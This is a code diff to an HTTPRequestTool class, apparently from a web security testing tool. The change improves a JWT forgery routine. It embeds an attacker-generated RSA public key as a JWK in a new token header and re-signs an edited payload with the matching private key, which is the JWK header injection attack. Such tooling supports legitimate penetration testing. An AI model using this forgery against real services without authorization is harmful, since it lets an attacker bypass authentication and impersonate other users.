@@ -825,21 +825,32 @@ class HTTPRequestTool:
                     public_key = private_key.public_key()
                     public_numbers = public_key.public_numbers()
                     
+                    # Generate a random kid
+                    kid = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8').rstrip('=')
+                    
+                    # Create JWK with proper format
                     jwk = {
                         "kty": "RSA",
                         "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip('='),
-                        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip('=')
+                        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).decode('utf-8').rstrip('='),
+                        "kid": kid,
+                        "alg": "RS256",
+                        "use": "sig"
                     }
                     
-                    # Add the JWK to the header
-                    header["jwk"] = jwk
+                    # Create a new clean header
+                    new_header = {
+                        "alg": "RS256",
+                        "typ": "JWT",
+                        "jwk": jwk
+                    }
                     
                     # Sign the token with the private key
                     modified_token = jwt.encode(
                         edited_payload,
                         private_key,
                         algorithm='RS256',
-                        headers=header
+                        headers=new_header
                     )
                     
                     # Replace the original token in the request
